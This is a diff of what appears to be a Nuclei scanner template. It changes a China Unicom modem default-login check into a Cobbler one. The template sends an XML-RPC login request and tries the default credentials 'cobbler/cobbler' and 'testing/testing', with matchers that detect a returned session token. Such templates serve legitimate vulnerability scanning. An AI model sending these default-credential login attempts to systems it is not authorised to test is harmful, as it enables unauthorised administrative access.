@@ -1,38 +1,72 @@
-id: chinaunicom-default-login
+id: cobbler-default-login
 
 info:
-  name: China Unicom Modem Default Login
-  author: princechaddha
+  name: Cobbler Default Login
+  author: c-sh0
+  description: Cobbler contains a vulnerability where default login information is available via /etc/cobbler/modules.conf in the [authentication] part of the module “testing” and “testing:testing” is used to authenticate users.
+  reference:
+    - https://seclists.org/oss-sec/2022/q1/146
+    - https://github.com/cobbler/cobbler/issues/2307
+    - https://github.com/cobbler/cobbler/issues/2909
   severity: high
-  description: Default login information that would allow administrative access to a China Unicom Modem was discovered.
-  tags: chinaunicom,default-login
+  tags: cobbler,default-login,api
   classification:
     cwe-id: 798
 
 requests:
   - raw:
       - |
-        POST /cu.html HTTP/1.1
+        POST {{BaseURL}}/cobbler_api HTTP/1.1
         Host: {{Hostname}}
+        Content-Type: text/xml
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 
-        frashnum=&action=login&Frm_Logintoken=1&Username={{username}}&Password={{password}}&Username=&Password=
+        <?xml version='1.0'?>
+        <methodCall>
+          <methodName>login</methodName>
+          <params>
+            <param>
+              <value>
+                <string>{{username}}</string>
+              </value>
+            </param>
+            <param>
+              <value>
+                <string>{{password}}</string>
+              </value>
+            </param>
+          </params>
+        </methodCall>
 
     attack: pitchfork
     payloads:
       username:
-        - CUAdmin
+        - cobbler
+        - testing
       password:
-        - CUAdmin
+        - cobbler
+        - testing
 
     matchers-condition: and
     matchers:
       - type: status
         status:
-          - 302
+          - 200
 
       - type: word
-        words:
-          - "/menu.gch"
         part: header
+        words:
+          - 'text/xml'
+
+      - type: dsl
+        dsl:
+          - "!contains(tolower(body), '<name>faultCode</name>')"
+          - "!contains(tolower(body), 'login failed')"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "(.*[a-zA-Z0-9].+==)</string></value>"
 
 # Enhanced by mp on 2022/03/02
